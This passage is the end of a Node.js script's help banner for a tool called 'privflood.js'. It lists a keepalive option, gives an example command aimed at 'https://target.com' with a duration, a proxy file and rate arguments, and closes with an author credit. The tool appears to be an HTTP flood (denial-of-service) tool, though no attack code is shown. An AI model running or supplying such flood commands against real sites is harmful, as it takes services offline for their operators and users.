    ${colors.red('◆')} ${colors.white('-k <ms>:')} ${colors.gray('Initial keepalive')}
    
    ${colors.white('Example:')}
    ${colors.brightRed('node privflood.js https://target.com 120 proxies.txt 100 64 -c -h -ddg -v 2')}
    
    ${colors.dim('────────────────────────────────────────────────────')}
    ${colors.brightRed('⚡')} ${colors.white('Made with')} ${colors.red('❤')} ${colors.white('by')} ${colors.brightRed('PRIVFLOOD')} ${colors.white('(@privflood)')}
    ${colors.dim('────────────────────────────────────────────────────')}
    `));
}
